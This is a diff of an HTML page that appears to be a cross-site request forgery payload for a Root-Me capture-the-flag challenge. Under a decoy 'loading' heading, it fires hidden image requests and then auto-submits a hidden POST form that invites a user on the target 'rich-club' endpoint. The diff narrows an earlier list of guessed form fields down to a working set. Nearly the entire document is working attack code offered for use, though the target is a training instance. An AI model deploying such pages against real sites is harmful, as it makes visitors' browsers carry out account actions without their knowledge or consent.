@@ -1,40 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="no-referrer">
     <title>Chargement...</title>
 </head>
 <body>
-    <h1>Chargement en cours...</h1>
+    <h1>Chargement du projet en cours...</h1>
 
-    <form action="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club" method="POST" id="soup-form">
-        
+    <img src="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club?username=a" style="display:none">
+    <img src="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club?invite=a" style="display:none">
+    <img src="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club?action=invite&username=a" style="display:none">
+
+    <form action="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club" method="POST" id="final-form">
         <input type="hidden" name="username" value="a">
-        <input type="hidden" name="user" value="a">
-        <input type="hidden" name="pseudo" value="a">
-        <input type="hidden" name="login" value="a">
-        <input type="hidden" name="recipient" value="a">
-        <input type="hidden" name="target" value="a">
-        <input type="hidden" name="member" value="a">
-        <input type="hidden" name="friend" value="a">
-
-        <input type="hidden" name="email" value="a">
-        <input type="hidden" name="mail" value="a">
-
-        <input type="hidden" name="submit" value="1">
         <input type="hidden" name="submit" value="Invite">
-        <input type="hidden" name="action" value="invite">
-        <input type="hidden" name="action" value="add">
-        <input type="hidden" name="do" value="invite">
-        <input type="hidden" name="invite" value="1">
-        <input type="hidden" name="add" value="1">
-
     </form>
 
     <script>
-        // On laisse une petite pause de 500ms pour être sûr que le navigateur est prêt
+        // On laisse 1 seconde aux images (GET) pour se charger
         setTimeout(function() {
-            document.getElementById('soup-form').submit();
-        }, 500);
+            document.getElementById('final-form').submit();
+        }, 1000);
     </script>
 
 </body>
